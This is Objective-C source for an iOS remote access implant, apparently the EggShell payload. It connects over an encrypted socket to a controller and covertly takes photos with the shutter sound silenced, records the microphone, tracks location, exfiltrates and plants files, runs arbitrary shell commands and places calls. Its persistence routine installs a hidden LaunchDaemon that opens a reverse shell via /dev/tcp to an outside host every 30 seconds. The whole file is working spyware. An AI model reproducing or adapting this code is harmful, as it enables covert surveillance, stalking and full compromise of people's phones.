#import "espl.h"
CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);

@implementation espl
    
@synthesize recorder;

BOOL systaskrunning = false;

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    _fileManager = [[NSFileManager alloc] init];
    _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
    return self;
}

//MARK: Socketry

int sockfd;

-(int)connect:(NSString*)host :(long)port {
    socklen_t len;
    struct sockaddr_in address;
    int result;
    
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
    address.sin_port = htons (port);
    len = sizeof (address);
    result = connect (sockfd, (struct sockaddr *) &address, len);
    
    return result;
}

-(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
    [self blank];
    long bsize = 1024;
    char buffer[bsize];
    NSMutableData *data = [NSMutableData alloc];
    //we use both chunks to make sure we never check an incomplete terminator string
    NSString *lastchunk = @"";
    NSString *thischunk = @"";
    while(read (sockfd, &buffer, sizeof(buffer))) {
        //append data
        thischunk = [NSString stringWithFormat:@"%s",buffer];
        [data appendBytes:buffer length:sizeof(buffer)];
        //detect terminator, decrypt data, write to file
        if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
            //base64 decode file data
            data = [[NSMutableData alloc] initWithBase64EncodedData:
                    [data subdataWithRange:NSMakeRange(0, fileSize)] options:0];
            //decrypt nsdata and write to file
            [[escryptor decryptNSData:_skey :data] writeToFile:saveToPath atomically:true];
            break;
        }
        lastchunk = [NSString stringWithFormat:@"%s",buffer];
        memset(buffer,'\0',sizeof(buffer));
    }
    [self blank];
}

-(void)sendFileData:(NSData*)fileData {
    NSData *encryptedData = [escryptor encryptNSData:self.skey :fileData];
    [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)encryptedData.length]];
    write (sockfd, [encryptedData bytes], encryptedData.length);
    write (sockfd, [_terminator UTF8String], _terminator.length);
}

-(void)sendString:(NSString *)string {
    string = [string stringByReplacingOccurrencesOfString:@"’" withString:@"'"];
    NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
    write (sockfd, [finalstr UTF8String], finalstr.length);
}

-(void)liveSendString:(NSString *)string {
    NSMutableString *reversed = [NSMutableString string];
    NSInteger charIndex = [_terminator length];
    while (charIndex > 0) {
        charIndex--;
        NSRange subRange = NSMakeRange(charIndex, 1);
        [reversed appendString:[_terminator substringWithRange:subRange]];
    }
    
    NSString *finalstr = [NSString stringWithFormat:@"%@%@",
                          [escryptor encryptNSStringToB64:self.skey :string],reversed];
    write (sockfd, [finalstr UTF8String], finalstr.length);
}

//MARK: Convenience

-(void)blank {
    [self sendString:@""]; //bang
}

-(NSString *)forgetFirst:(NSArray *)args {
    int x = 1;
    NSString *path = @"";
    for (NSString *tpath in args) {
        if (x != 1) {
            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
        }
        x++;
    }
    return [path substringToIndex:[path length] - 1];
}

//MARK: Camera

-(NSData*)camera:(BOOL)isfront {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:@"silenceShutter" forKey:@"cmd"];
    [_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo];
    [self setupCaptureSession:isfront];
    [NSThread sleepForTimeInterval:0.2];
    //this guy deserves a medal
    //http://stackoverflow.com/questions/22549020/capture-a-still-image-on-ios7-through-a-console-app
    __block BOOL done = NO;
    __block NSData *pictureData;
    [self captureWithBlock:^(NSData *imageData) {
        done = YES;
        pictureData = imageData;
    }];
    while (!done)
    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
    return pictureData;
}

-(AVCaptureDevice *)frontFacingCameraIfAvailable
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionFront){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

-(AVCaptureDevice *)backFacingCameraIfAvailable
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionBack){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

- (void)setupCaptureSession:(BOOL)isfront{
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetMedium;
    
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    if (isfront)
        device = [self frontFacingCameraIfAvailable];
    else
        device = [self backFacingCameraIfAvailable];
    
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
    [self.session addInput:input];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [outputSettings release];
    [self.session addOutput:self.stillImageOutput];
    [self.session startRunning];
}

- (void)captureWithBlock:(void(^)(NSData* imageData))block
{
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         block(imageData);
     }];
    [_stillImageOutput release];
    [_session release];
}

//MARK: Mic

-(void)mic:(NSString *)arg {
    NSString *usage = @"Usage: mic record|stop";
    if ([arg isEqualToString:@""]) {
        [self sendString:usage];
        return;
    }
    if ([arg isEqual:@"record"]) {
        NSString *file = @"/tmp/.avatmp";
        [_fileManager removeItemAtPath:file error:NULL];
        [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
        
        NSString *destinationString = file;
        NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
        NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
                                     AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
                                     AVNumberOfChannelsKey: @1,
                                     AVSampleRateKey: @22050.0f};
        [[AVAudioSession sharedInstance] setActive:YES error:nil];
        recorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
        recorder.meteringEnabled = true;
        recorder.delegate = self;
        
        [recorder prepareToRecord];
        [recorder record];
        [self sendString:@"Listening..."];
    }
    else if ([arg isEqualToString:@"stop"]) {
        if ([recorder isRecording]) {
            [recorder stop];
            [self sendString:@"1"];
        }
        else {
            [self sendString:@"Not currently recording"];
        }
    }
    else {
        [self sendString:usage];
    }
}

//MARK: File Management

-(void)directoryList:(NSString *)arg {
    //basically "ls"
    NSArray *files;
    NSString *dir = [_fileManager currentDirectoryPath];
    if (![arg isEqualToString:@""]) {
        dir = arg;
    }
    
    NSError *error = nil;
    files = [_fileManager contentsOfDirectoryAtPath:dir error:&error];
    if (error != nil) {
        [self sendString:[NSString stringWithFormat:@"%@",error]];
        return;
    }
    
    NSString *result = @"";
    for (NSString *f in files) {
        result = [result stringByAppendingString:[NSString stringWithFormat:@"%@\n",f]];
    }
    if ([result length] > 0) {
        result = [result substringToIndex:[result length] - 1];
    }
    [self sendString:result];
}

-(void)rmFile:(NSString *)arg {
    NSString *file = @"";
    if (![arg isEqualToString:@""]) {
        file = arg;
    }
    else {
        [self sendString:@"Usage: rm filename"];
        return;
    }
    BOOL isdir = false;
    if ([_fileManager fileExistsAtPath:file isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]];
        }
        else {
            [_fileManager removeItemAtPath:file error:NULL];
            [self blank];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]];
    }
}

-(void)changeWD:(NSString *)arg {
    //basically "cd"
    NSString *dir = NSHomeDirectory();
    if (![arg isEqualToString:@""]) {
        dir = arg;
    }
    BOOL isdir = false;
    if ([_fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (isdir) {
            [_fileManager changeCurrentDirectoryPath:dir];
            NSString *blank = @"";
            [self sendString:[NSString stringWithFormat:blank,dir]];
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
    }
}

-(void)sendEncryptedFile:(NSData *)fileData {
    NSString *writeToFileName = @"/tmp/.tmpenc";
    fileData = [fileData AES256EncryptWithKey:_skey];
    [fileData writeToFile:writeToFileName atomically:true];
    
    char bufferin[256];
    FILE *fp;
    fp = fopen([writeToFileName UTF8String], "r");
    /*
     stream file to socket
     some padding will exist but only at the end of the file
     we can handle this server side by removing the offset
     */
    while (!feof(fp))
    {
        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
        if (nRead <= 0)
        printf("ERROR reading file\n");
        
        char *pBuf = bufferin;
        while (nRead > 0)
        {
            long nSent = send(sockfd, pBuf, nRead, 0);
            
            if (nSent == -1)
            {
                fd_set writefd;
                FD_ZERO(&writefd);
                FD_SET(sockfd, &writefd);
                
                if (select(0, NULL, &writefd, NULL, NULL) != 1)
                printf("ERROR waiting to write to socket\n");
                continue;
            }
            
            if (nSent == 0)
            printf("DISCONNECTED writing to socket\n");
            
            pBuf += nSent;
            nRead -= nSent;
        }
    }
    //our end send file command
    write(sockfd, [_terminator UTF8String], _terminator.length);
}

-(NSData*)filePathToData:(NSString *)arg {
    BOOL isdir;
    if ([_fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
        }
        else {
            return [_fileManager contentsAtPath:arg];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
    }
    return NULL;
}

//MARK: Misc

-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
//    manager.delegate = self;
    [manager startUpdatingLocation];
    
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
    NSString *longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];
    NSString *result = [NSString stringWithFormat:@"Latitude : %@\nLongitude : %@\nhttp://maps.google.com/maps?q=%@,%@",latitude,longitude,latitude,longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"Unable to get Coordinates\nAre location services enabled?";
    }
    [manager release];
    [self sendString:result];
}

-(void)eslog:(NSString *)str {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",str] UTF8String]);
    #pragma GCC diagnostic pop
}

-(void)exec:(NSString *)command {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    system([command UTF8String]);
    #pragma GCC diagnostic pop
}

-(void)vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
    [self blank];
}

-(void)sysinfo {
    uint64_t totalSpace = 0;
    uint64_t totalFreeSpace = 0;
    NSError *error = nil;
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSDictionary *dictionary = [[NSFileManager defaultManager] attributesOfFileSystemForPath:[paths lastObject] error: &error];
    
    if (dictionary) {
        NSNumber *fileSystemSizeInBytes = [dictionary objectForKey: NSFileSystemSize];
        NSNumber *freeFileSystemSizeInBytes = [dictionary objectForKey:NSFileSystemFreeSize];
        totalSpace = [fileSystemSizeInBytes unsignedLongLongValue];
        totalFreeSpace = [freeFileSystemSizeInBytes unsignedLongLongValue];
    }

    NSString *info = [NSString stringWithFormat:@"Model: %@\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n%@",
                      [_thisUIDevice model],
                      [_thisUIDevice systemName],[_thisUIDevice systemVersion],
                      [_thisUIDevice name],
                      [_thisUIDevice identifierForVendor],
                      [self battery]];
    [self sendString:info];
}

-(void)say:(NSString *)string {
    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:string];
    utterance.rate = 0.4;
    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
    [syn speakUtterance:utterance];
    [self blank];
}

-(void)displayalert:(const char *)title :(const char *)message {
    extern char *optarg;
    extern int optind;
    CFTimeInterval timeout = 0;
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryAddValue( dict, kCFUserNotificationAlertHeaderKey, CFStringCreateWithCString(NULL, title, kCFStringEncodingUTF8) );
    CFDictionaryAddValue( dict, kCFUserNotificationAlertMessageKey, CFStringCreateWithCString(NULL, message, kCFStringEncodingUTF8) );
    SInt32 error;
    CFOptionFlags flags = 0;
    flags |= kCFUserNotificationPlainAlertLevel;
    CFDictionaryAddValue( dict, kCFUserNotificationAlertTopMostKey, kCFBooleanTrue );
    CFNotificationCenterPostNotificationWithOptions( CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("test"),  NULL, NULL, kCFNotificationDeliverImmediately );
    CFUserNotificationRef notif = CFUserNotificationCreate( NULL, timeout, flags, &error, dict );
    CFOptionFlags options;
    CFUserNotificationReceiveResponse( notif, 0, &options );
    CFUserNotificationGetResponseDictionary(notif);
}

-(void)alert:(NSArray *)args {
    //our arguments were encoded in base64 so we can have multiple words in multiple arguments
    NSData *titledata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[0]] options:0];
    NSString *titlestring = [[NSString alloc] initWithData:titledata encoding:NSUTF8StringEncoding];
    NSData *messagedata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[1]] options:0];
    NSString *messagestring = [[NSString alloc] initWithData:messagedata encoding:NSUTF8StringEncoding];
    //run in background! cool
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self displayalert:[titlestring UTF8String]:[messagestring UTF8String]];
    });
    [self sendString:@""];
}

-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
}

-(void)openURL:(NSString *)arg {
    if (![arg isEqualToString:@""]) {
        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[arg UTF8String], strlen([arg UTF8String]), kCFStringEncodingUTF8, NULL);
        if(!cu) {
            [self sendString:@"Invalid URL"];
        }
        else {
            bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
            if (!ret) {
                [self sendString:[NSString stringWithFormat:@"Error opening url %@",arg]];
            }
            else {
                [self blank];
            }
        }
    }
    else {
        [self sendString:@"Usage example: openurl http://google.com"];
    }
}
    
-(void)dial:(NSString *)arg {
    if (![arg isEqualToString:@""]) {
        [self openURL:[NSString stringWithFormat:@"tel://%@",arg]];
    }
    else {
        [self sendString:@"Usage example: dial 5553334444"];
    }
}

-(void)setVolume:(NSString *)arg {
    //TODO: update
    if (![arg isEqualToString:@""]) {
        #pragma GCC diagnostic push
        #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
        [[MPMusicPlayerController applicationMusicPlayer]setVolume:[arg floatValue]];
        #pragma GCC diagnostic pop
        [self blank];
    }
    else {
        [self sendString:@"Usage example: volume 0.1"];
    }
}

-(void)getVolume {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    [self sendString:[NSString stringWithFormat:@"%.2f",[[MPMusicPlayerController applicationMusicPlayer]volume]]];
    #pragma GCC diagnostic pop
}

-(void)isplaying {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    float currentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
    [NSThread sleepForTimeInterval:0.1];
    float newcurrentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
    if (currentpbt != newcurrentpbt) {
        [NSThread sleepForTimeInterval:0.1];
        MPMediaItem * song = [[MPMusicPlayerController iPodMusicPlayer] nowPlayingItem];
        NSString * title   = [song valueForProperty:MPMediaItemPropertyTitle];
        NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
        NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
        NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f",title,album,artist,newcurrentpbt];
        [self sendString:mpstatus];
    }
    else {
        [self sendString:@"Not Playing"];
    }
    #pragma GCC diagnostic pop
}


-(void)listapps {
    NSString *apps = @"";
    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
    if (ary != NULL) {
        for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
            if (CFArrayGetValueAtIndex(ary, i)) {
                apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
            }
        }
        [self sendString:apps];
    }
    else {
        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers"];
    }
}

-(NSString *)battery {
    int batinfo=([_thisUIDevice batteryLevel]*100);
    return [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
}

-(void)launchApp:(NSString *)arg {
    if (![arg isEqualToString:@""]) {
        int ret;
        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
        assert(identifier != NULL);
        
        ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
        
        if (ret != 0) {
            [self sendString:@"Cannot open app, is device locked?"];
            return;
        }
        
        CFRelease(identifier);
        [self blank];
    }
    else {
        [self sendString:@"Usage: open BundleIdentifier"];
    }
}

-(void)runtask:(NSString *)cmd {
    if ([cmd  isEqual: @"endtask"] && systaskrunning) {
        [_systask terminate];
        return;
    }
    //http://stackoverflow.com/questions/23937690/getting-process-output-using-nstask-on-the-go
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        systaskrunning = true;
        _systask = [[NSTask alloc] init];
        [_systask setLaunchPath:@"/bin/bash"];
        [_systask setArguments:@[ @"-c", cmd]];
        [_systask setCurrentDirectoryPath:[_fileManager currentDirectoryPath]];
        
        NSPipe *stdoutPipe = [NSPipe pipe];
        [_systask setStandardOutput:stdoutPipe];
        [_systask setStandardError:stdoutPipe];
        
        NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
        [stdoutHandle waitForDataInBackgroundAndNotify];
        id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                                        object:stdoutHandle queue:nil
                                                                    usingBlock:^(NSNotification *note)
                       {
                           NSData *dataRead = [stdoutHandle availableData];
                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
                           [self liveSendString:newOutput];
                           [stdoutHandle waitForDataInBackgroundAndNotify];
                       }];
        [_systask launch];
        [_systask waitUntilExit];
        [[NSNotificationCenter defaultCenter] removeObserver:observer];
        systaskrunning = false;
        [self blank];
    });
}


-(void)persistence:(NSString *)ip :(int)port {
    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
    if ([_fileManager fileExistsAtPath:loaderpath]) {
        [self sendString:@"Persistence already installed"];
    }
    else {
        NSString *plist = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\
        <plist version=\"1.0\"><dict><key>Label</key>\
        <string>com.example.touchsomefile</string>\
        <key>ProgramArguments</key>\
        <array><string>bash</string><string>-c</string>\
        <string>bash &gt;&amp; /dev/tcp/%@/%d 0&gt;&amp;1</string>\
        </array><key>RunAtLoad</key><true/>\
        <key>StartInterval</key><integer>30</integer>\
        </dict></plist>",ip,port];
        [plist writeToFile:@"/Library/LaunchDaemons/.esploader.plist"
                atomically:true
                  encoding:NSUTF8StringEncoding
                     error:nil];
        [self exec:[NSString stringWithFormat:@"launchctl load %@",loaderpath]];
        [self sendString:@"Persistence Installed"];
    }
}

-(void)rmpersistence {
    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
    if ([_fileManager fileExistsAtPath:loaderpath]) {
        [self exec:[NSString stringWithFormat:@"launchctl unload %@",loaderpath]];
        [_fileManager removeItemAtPath:loaderpath error:NULL];
        [self sendString:@"Persistence removed"];
    }
    else {
        [self sendString:@"Persistence not installed"];
    }
}

//MARK: EggShell Pro

-(void)upload:(NSString *)uploadpath {
    @autoreleasepool {
        long dinc = 0;
        NSString *filedata = @"";
        while(1) {
            char buffer[1024];
            read(sockfd, &buffer, sizeof(buffer));
            filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
            dinc += 1024;
            memset(buffer,'\0',1024);
            if (strstr([filedata UTF8String],[_terminator UTF8String])) {
                filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
                break;
            }
        }
        NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
        [fdata writeToFile:uploadpath atomically:true];
    }
}

-(void)mcSendNoReply:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo]) {
        [self blank];
    }
    else {
        [self sendString:@"You dont have eggshellPro Extension"];
    }
}

-(void)mcSendYesReply:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    [self sendString:replystr];
}

-(void)locationService:(NSString *)arg {
    NSString *howto = @"Usage example: locationservice off/locationservice on";
    if ([arg isEqualToString: @"on"]) {
        [self mcSendNoReply:@"locationon"];
    }
    else if ([arg isEqualToString: @"off"]) {
        [self mcSendNoReply:@"locationoff"];
    }
    else {
        [self sendString:howto];
    }

}


@end
